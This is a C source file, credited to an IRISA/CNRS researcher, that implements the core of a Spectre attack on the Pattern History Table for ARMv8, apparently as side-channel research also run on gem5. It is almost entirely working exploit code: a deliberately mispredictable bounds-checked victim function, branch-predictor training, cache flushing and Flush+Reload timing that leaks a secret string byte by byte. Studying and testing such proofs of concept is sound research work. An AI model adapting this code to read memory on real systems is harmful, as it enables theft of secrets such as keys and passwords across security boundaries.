/**
 * \brief  Spectre PHT-SA-IP.
 * \author Pierre AYOUB -- IRISA, CNRS
 * \date   2020
 *
 * \details This file contain the core of a Spectre attack, targeting the
 *          Pattern History Table, in a same address-space and an in-place
 *          training.
 * \note The Spectre core code is based on the PoC from the original paper, but
 *       it has been modified with important efficiency improvements.
 * \warning Sometime, code is weird. Bit twiddling, variable in different scope
 *          or with special keywords, long functions... For Spectre efficiency,
 *          the goal is to minimize branch predictor and cache overhead: this
 *          has impact on the code.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h> /* For memset(). */
#include <stdint.h>

/* Contain ARMv8 implementation of flush, rdtsc and [im]fence. */
#include "asm.h"
/* Used for \sa {struct arguments}. */
#include "util.h"

#include "spectre_pht_sa_ip.h"

/* * Victim code: */

/* ** Public variables: */

/* Note the padding to be sure that all arrays do not produce hit in the same
 * cache line.  */
uint8_t unused1[CACHELINE];
uint8_t array1[160] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16};
uint8_t unused2[CACHELINE];

uint8_t array2[256 * PAGESIZE];

char *secret = "The Magic Words are Squeamish Ossifrage.";

/* ** Private variables: */

/* Size of the shared array used for the offset. */
unsigned int array1_size = 16;

/* Used so compiler won't optimize out victim_function(). */
uint8_t temp = 0;

/* ** Private functions: */

/* Function that will be tricked by Spectre. */
static void victim_function(size_t x) {
    /* Flush the variables used in the condition to add a higher delay. */
    mfence();
    flush(&array1_size);
    flush(&x);
    /* Ensure data is flushed at this point. */
    mfence();
    ifence();
    /* Perform a legitimate array access, with bound checking. This branch will
       be tricked by Spectre during the attack phase. We use a division instead
       of an int-comparison since it takes more time, thus increase the
       transient execution window. */
    if ((float) x / (float) array1_size < 1)
        temp &= array2[array1[x] * PAGESIZE];
}

/* * Analysis code: */

void spectre_pht_sa_ip_read(size_t malicious_x, struct arguments * args, uint8_t * value, int * score) {
    /* Setup all the parameters at the beginning of the function. Important for
       probability of success. */

    /* Table that will hold scores for each possibility (256) to guess one
       byte. Note that it MUST be declared as "static", but I don't know
       why. */
	static int results[256];
    /* The number of attempts to guess one byte. Same note as above for static
       keywords. */
    static int tries, loops;
    tries = args->tries;
    loops = args->loops;
    /* i, mix_i: Index array2 and results arrays.
     * i: Count the number of training and attacks.
     * j, k: Search the best results.
     * junk: Force non-optimization. */
    int i, mix_i, j, k, junk = 0;
    /* Theses are the offset given to array1. The training one is legit, while
       the second is used for transient attack. */
	size_t training_x, x;
    /* Used to compute the time taken by the access to a byte at "addr". */
	register uint64_t time1, time2;
	volatile uint8_t *addr;

    /* Initialize the results array. */
    memset(results, 0, sizeof(results));
    /* Do 999 attempts (by default) to guess the byte. */
    for (; tries > 0; tries--) {
        /* Attack preparation. */
        
		/* Flush the array2[PAGESIZE * (0 .. 255)] from the cache. */
		for (i = 0; i < 256; i++) {
			flush(&array2[i * PAGESIZE]);
            /* Don't work if we not wait for completion here. Usually, these
               two calls would be outside the loop. In this case, we need them
               inside the loop to work on gem5. */
            mfence();
            ifence();
        }

        /* Attack execution. */

        /* The offset used for the training will walk the array1. */
		training_x = tries % array1_size;
		/* Execute 30 loops (by default): 5 training runs (x = training_x) per
           attack run (x = malicious_x). */
		for (i = loops; i >= 0; i--) {
            /* Don't work if we not wait for completion here. */
            mfence();
			/* Bit twiddling to set : x = (i % 6 != 0) ? training_x : malicious_x; */
			/* It avoid jumps in case those tip off the branch predictor. */
			x = ((i % 6) - 1) & ~0xFFFF;                       /* Set x = (i % 6 == 0) ? 0xFF..FF0000 : 0; */
			x |= x >> 16;                                      /* Set x = (i & 6 == 0) ? -1 : 0; */
			x = training_x ^ (x & (malicious_x ^ training_x)); /* Set x = (x == 0) ? training_x : malicious_x; */
			
			/* Call the victim function, either training or attacking it. */
			victim_function(x);
		}

        /* Attack's data retrieval. */

        /* Avoid speculative execution before the attack end. */
        mfence();
		/* Iterate over each possibility for the guessed byte. */
		for (i = 0; i < 256; i++) {
            /* Order is lightly mixed up to prevent stride prediction. */
			mix_i = ((i * 167) + 13) & 255;
            /* Time the access to array2 for this possibility. */
			addr = &array2[mix_i * PAGESIZE];
			time1 = rdtsc();
			junk = *addr; /* Could use "mem_acces(addr);" here. To be tested. TODO */
			time2 = rdtsc() - time1;
            /* If the access is a cache hit and the possibility isn't the
               training one, it has a good chance to correspond to the
               transiently accessed byte. Increase his score. */
			if (time2 <= CACHE_HIT_THRESHOLD && mix_i != array1[training_x])
				results[mix_i]++; 
		}
        
        /* Attack's results estimation. */

		/* Locate highest & second-highest results tallies and place their
           index in j/k. */
		j = k = -1;
        /* Iterate over each possibilities. */
		for (i = 0; i < 256; i++) {
            /* If the best guess isn't initialized or if we find better. */
			if (j < 0 || results[i] >= results[j]) {
				k = j;
				j = i;
            /* If the 2nd best guess isn't initialized or if we find better. */ 
			} else if (k < 0 || results[i] >= results[k]) {
				k = i;
			}
		}
        /* If we find that (1st's score > 2 * 2nd's score) or 2/0, we can say
           that it's a clear success and stop the research to gain a lot of
           speed. */
		if (results[j] >= (2 * results[k]) || (results[j] == 2 && results[k] == 0))
			break;
	}

    /* Store the best guess to report it to main. */
	results[0] ^= junk;  /* Use junk so code above won't get optimized out. */
	*value = (uint8_t) j;
	*score = results[j];
}
